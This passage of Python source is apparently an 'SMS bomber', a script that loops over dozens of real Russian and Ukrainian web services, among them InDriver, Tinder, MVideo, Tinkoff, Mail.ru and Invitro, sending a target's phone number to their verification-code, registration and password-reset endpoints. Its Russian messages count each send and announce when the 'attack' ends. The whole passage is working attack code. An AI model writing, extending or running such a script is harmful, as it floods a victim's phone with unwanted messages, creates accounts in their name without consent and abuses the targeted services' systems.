            requests.post("https://terra-1.indriverapp.com/api/authorization?locale=ru",
                          data={"mode": "request", "phone": "+" + _phone, "phone_permission": "unknown", "stream_id": 0,
                                "v": 3, "appversion": "3.20.6", "osversion": "unknown", "devicemodel": "unknown"})
            R = R + 1
            print('[+] InDriver Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post("https://lk.invitro.ru/sp/mobileApi/createUserByPassword",
                          data={"password": password, "application": "lkp", "login": "+" + _phone})
            R = R + 1
            print('[+] Invitro Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://ube.pmsm.org.ru/esb/iqos-phone/validate', json={"phone": _phone})
            R = R + 1
            print('[+] Pmsm Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post("https://api.ivi.ru/mobileapi/user/register/phone/v6", data={"phone": _phone})
            R = R + 1
            print('[+] IVI Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://lenta.com/api/v1/authentication/requestValidationCode', json={'phone': '+' + _phone})
            R = R + 1
            print('[+] Lenta Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://cloud.mail.ru/api/v2/notify/applink',
                          json={"phone": "+" + _phone, "api": 2, "email": "email", "x-email": "x-email"})
            R = R + 1
            print('[+] Mail.ru Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCode',
                          params={"pageName": "registerPrivateUserPhoneVerificatio"},
                          data={"phone": _phone, "recaptcha": 'off', "g-recaptcha-response": ""})
            R = R + 1
            print('[+] MVideo Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",
                          data={"st.r.phone": "+" + _phone})
            R = R + 1
            print('[+] OK Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post("http://smsgorod.ru/sendsms.php", data={"number": _phone})
            R = R + 1
            print('[+] SMSgorod Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',
                          data={'phone_number': _phone})
            R = R + 1
            print('[+] Tinder Отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://passport.twitch.tv/register?trusted_request=true',
                          json={"birthday": {"day": 11, "month": 11, "year": 1999},
                                "client_id": "kd1unb4b3q4t58fwlpcbzcbnm76a8fp", "include_verification_code": True,
                                "password": password, "phone_number": _phone, "username": username})
            R = R + 1
            print('[+] Twitch Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://cabinet.wi-fi.ru/api/auth/by-sms', data={'msisdn': _phone},
                          headers={'App-ID': 'cabinet'})
            R = R + 1
            print('[+] CabWiFi Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post("https://api.wowworks.ru/v2/site/send-code", json={"phone": _phone, "type": 2})
            R = R + 1
            print('[+] wowworks Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://eda.yandex/api/v1/user/request_authentication_code',
                          json={"phone_number": "+" + _phone})
            R = R + 1
            print('[+] Eda.Yandex Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/',
                          json={"client_type": "personal", "email": f"{email}@gmail.ru", "mobile_phone": _phone,
                                "deliveryOption": "sms"})
            R = R + 1
            print('[+] Alpari Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post("https://api-prime.anytime.global/api/v2/auth/sendVerificationCode", data={"phone": _phone})
            R = R + 1
            print('[+] SMS Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://www.delivery-club.ru/ajax/user_otp', data={"phone": _phone})
            R = R + 1
            print('[+] Delivery Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.get('https://requests.service.banki.ru/form/960/submit',
                         params={"callback": "submitCallback", "name": _name, "phone": "+" + _phone, "email": _email,
                                 "gorod": "Москва", "approving_data": "1", })
            R = R + 1
            print('[+] Banki Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        try:
            requests.post('https://api.ivi.ru/mobileapi/user/register/phone/v6', data={"phone": _phone})
            R = R + 1
            print('[+] IVI Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://www.moyo.ua/identity/registration',
                          data={"firstname": _name, "phone": _phone, "email": _email})
            R = R + 1
            print('[+] Moyo Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://helsi.me/api/healthy/accounts/login', json={"phone": _phone, "platform": "PISWeb"})
            R = R + 1
            print('[+] Helsi Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://api.kinoland.com.ua/api/v1/service/send-sms', headers={"Agent": "website"},
                          json={"Phone": _phone, "Type": 1})
            R = R + 1
            print('[+] KinoLend Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://pizzahut.ru/account/password-reset',
                          data={'reset_by': 'phone', 'action_id': 'pass-recovery', 'phone': _phonePizzahut,
                                '_token': '*'})
            R = R + 1
            print('[+] PizzaHut Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://www.rabota.ru/remind', data={'credential': _phone})
            R = R + 1
            print('[+] Rabota Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://rutube.ru/api/accounts/sendpass/phone', data={'phone': '+' + _phone})
            R = R + 1
            print('[+] Rutube Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Rutube in sent!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://www.citilink.ru/registration/confirm/phone/+' + _phone + '/')
            R = R + 1
            print('[+] Citilink Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://www.smsint.ru/bitrix/templates/sms_intel/include/ajaxRegistrationTrigger.php',
                          data={'name': _name, 'phone': _phone, 'promo': 'yellowforma'})
            R = R + 1
            print('[+] Smsint Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.get(
                'https://www.oyorooms.com/api/pwa/generateotp?phone=' + _phone9 + '&country_code=%2B7&nod=4&locale=en')
            R = R + 1
            print('[+] oyorooms Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCode',
                          params={"pageName": "registerPrivateUserPhoneVerificatio"},
                          data={"phone": _phone, "recaptcha": "off", "g-recaptcha-response": "", })
            R = R + 1
            print('[+] MVIDEO Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://newnext.ru/graphql', json={'operationName': 'registration', 'variables': {
                'client': {'firstName': 'Иван', 'lastName': 'Иванов', 'phone': _phone, 'typeKeys': ['Unemployed']}},
                                                              'query': 'mutation registration($client: ClientInput!) {''\n  registration(client: $client) {''\n    token\n    __typename\n  }\n}\n'})
            R = R + 1
            print('[+] newnext Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://api.sunlight.net/v3/customers/authorization/', data={'phone': _phone})
            R = R + 1
            print('[+] Sunlight Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/',
                          json={'client_type': 'personal', 'email': _email, 'mobile_phone': _phone,
                                'deliveryOption': 'sms'})
            R = R + 1
            print('[+] alpari Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://lk.invitro.ru/lk2/lka/patient/refreshCode', data={'phone': _phone})
            R = R + 1
            print('[+] Invitro Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://online.sbis.ru/reg/service/',
                          json={'jsonrpc': '2.0', 'protocol': '5', 'method': 'Пользователь.ЗаявкаНаФизика',
                                'params': {'phone': _phone}, 'id': '1'})
            R = R + 1
            print('[+] Sberbank Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://prod.tvh.mts.ru/tvh-public-api-gateway/public/rest/general/send-code',
                          params={"msisdn": _phone})
            R = R + 1
            print('[+] MTS Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post("https://api.delitime.ru/api/v2/signup",
                          data={"SignupForm[username]": _phone, "SignupForm[device_type]": 3})
            R = R + 1
            print('[+] Delitime Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php',
                          data={'msisdn': _phone, "locale": 'en', 'countryCode': 'ru', 'version': '1',
                                "k": "ic1rtwz1s1Hj1O0r", "r": "46763"})
            R = R + 1
            print('[+] ICQ Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post("https://terra-1.indriverapp.com/api/authorization?locale=ru",
                          data={"mode": "request", "phone": "+" + _phone, "phone_permission": "unknown", "stream_id": 0,
                                "v": 3, "appversion": "3.20.6", "osversion": "unknown", "devicemodel": "unknown"})
            R = R + 1
            print('[+] InDriver Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post("https://lk.invitro.ru/sp/mobileApi/createUserByPassword",
                          data={"password": password, "application": "lkp", "login": "+" + _phone})
            R = R + 1
            print('[+] Invitro Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://ube.pmsm.org.ru/esb/iqos-phone/validate', json={"phone": _phone})
            R = R + 1
            print('[+] Pmsm Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post("https://api.ivi.ru/mobileapi/user/register/phone/v6", data={"phone": _phone})
            R = R + 1
            print('[+] IVI Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://lenta.com/api/v1/authentication/requestValidationCode', json={'phone': '+' + _phone})
            R = R + 1
            print('[+] Lenta Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://cloud.mail.ru/api/v2/notify/applink',
                          json={"phone": "+" + _phone, "api": 2, "email": "email", "x-email": "x-email"})
            R = R + 1
            print('[+] Mail.ru Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCode',
                          params={"pageName": "registerPrivateUserPhoneVerificatio"},
                          data={"phone": _phone, "recaptcha": 'off', "g-recaptcha-response": ""})
            R = R + 1
            print('[+] MVideo Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",
                          data={"st.r.phone": "+" + _phone})
            R = R + 1
            print('[+] OK Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post("http://smsgorod.ru/sendsms.php", data={"number": _phone})
            R = R + 1
            print('[+] SMSgorod Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',
                          data={'phone_number': _phone})
            R = R + 1
            print('[+] Tinder Отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://belkacar.ru/get-confirmation-code', data={'phone': _phone}, headers={})
            R = R + 1
            print('[+] BelkaCar Отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',
                          data={'phone_number': _phone}, headers={})
            R = R + 1
            print('[+] Tinder Отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://api.tinkoff.ru/v1/sign_up', data={'phone': '+' + _phone}, headers={})
            R = R + 1
            print('[+] Tinkoff Отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://api.mtstv.ru/v1/users', json={'msisdn': _phone}, headers={})
            R = R + 1
            print('[+] MTS Отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Ошибка при отправке!')



        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://pizzahut.ru/account/password-reset',
                          data={'reset_by': 'phone', 'action_id': 'pass-recovery', 'phone': _phonePizzahut,
                                '_token': '*'})
            R = R + 1
            print('[+] PizzaHut Отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://www.rabota.ru/remind', data={'credential': _phone})
            R = R + 1
            print('[+] Rabota Отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://rutube.ru/api/accounts/sendpass/phone', data={'phone': '+' + _phone})
            R = R + 1
            print('[+] Rutube Was sent!')
        except:
            requests.post('https://www.citilink.ru/registration/confirm/phone/+' + _phone + '/')
            print('[+] Citilink Отправлено! || Кол-во - ' + str(R))

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://www.smsint.ru/bitrix/templates/sms_intel/include/ajaxRegistrationTrigger.php',
                          data={'name': _name, 'phone': _phone, 'promo': 'yellowforma'})
            R = R + 1
            print('[+] Smsint Отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.get(
                'https://www.oyorooms.com/api/pwa/generateotp?phone=' + _phone9 + '&country_code=%2B7&nod=4&locale=en')
            R = R + 1
            print('[+] oyorooms Отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post(
                'https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCodeForOtp',
                params={'pageName': 'loginByUserPhoneVerification', 'fromCheckout': 'false',
                        'fromRegisterPage': 'true', 'snLogin': '', 'bpg': '', 'snProviderId': ''},
                data={'phone': _phone, 'g-recaptcha-response': '', 'recaptcha': 'on'})
            R = R + 1
            print('[+] MVideo Отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://newnext.ru/graphql', json={'operationName': 'registration', 'variables': {
                'client': {'firstName': 'Иван', 'lastName': 'Иванов', 'phone': _phone, 'typeKeys': ['Unemployed']}},
                                                              'query': 'mutation registration($client: ClientInput!) {''\n  registration(client: $client) {''\n    token\n    __typename\n  }\n}\n'})
            R = R + 1
            print('[+] newnext Отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://api.sunlight.net/v3/customers/authorization/', data={'phone': _phone})
            R = R + 1
            print('[+] Sunlight Отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/',
                          json={'client_type': 'personal', 'email': _email, 'mobile_phone': _phone,
                                'deliveryOption': 'sms'})
            R = R + 1
            print('[+] alpari Отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://lk.invitro.ru/lk2/lka/patient/refreshCode', data={'phone': _phone})
            R = R + 1
            print('[+] Invitro Отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://online.sbis.ru/reg/service/',
                          json={'jsonrpc': '2.0', 'protocol': '5', 'method': 'Пользователь.ЗаявкаНаФизика',
                                'params': {'phone': _phone}, 'id': '1'})
            R = R + 1
            print('[+] Sberbank Отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post("https://api.carsmile.com/",
                          json={"operationName": "enterPhone", "variables": {"phone": _phone},
                                "query": "mutation enterPhone($phone: String!) {\n  enterPhone(phone: $phone)\n}\n"})
            R = R + 1
            print('[+] carsmile Отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://www.citilink.ru/registration/confirm/phone/+' + _phone + '/')
            R = R + 1
            print('[+] Citilink Отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post("https://api.delitime.ru/api/v2/signup",
                          data={"SignupForm[username]": _phone, "SignupForm[device_type]": 3})
            R = R + 1
            print('[+] Delitime Отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Ошибка при отправке!')



        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php',
                          data={'msisdn': _phone, "locale": 'en', 'countryCode': 'ru', 'version': '1',
                                "k": "ic1rtwz1s1Hj1O0r", "r": "46763"})
            R = R + 1
            print('[+] ICQ Отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post("https://terra-1.indriverapp.com/api/authorization?locale=ru",
                          data={"mode": "request", "phone": "+" + _phone, "phone_permission": "unknown", "stream_id": 0,
                                "v": 3, "appversion": "3.20.6", "osversion": "unknown", "devicemodel": "unknown"})
            R = R + 1
            print('[+] InDriver Отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post("https://lk.invitro.ru/sp/mobileApi/createUserByPassword",
                          data={"password": password, "application": "lkp", "login": "+" + _phone})
            R = R + 1
            print('[+] Invitro Отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://ube.pmsm.org.ru/esb/iqos-phone/validate', json={"phone": _phone})
            R = R + 1
            print('[+] Pmsm Отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post("https://api.ivi.ru/mobileapi/user/register/phone/v6", data={"phone": _phone})
            R = R + 1
            print('[+] IVI Отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://lenta.com/api/v1/authentication/requestValidationCode',
                          json={'phone': '+' + self.formatted_phone})
            R = R + 1
            print('[+] Lenta Отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://cloud.mail.ru/api/v2/notify/applink',
                          json={"phone": "+" + _phone, "api": 2, "email": "email", "x-email": "x-email"})
            R = R + 1
            print('[+] Mail.ru Отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Ошибка при отправке!')

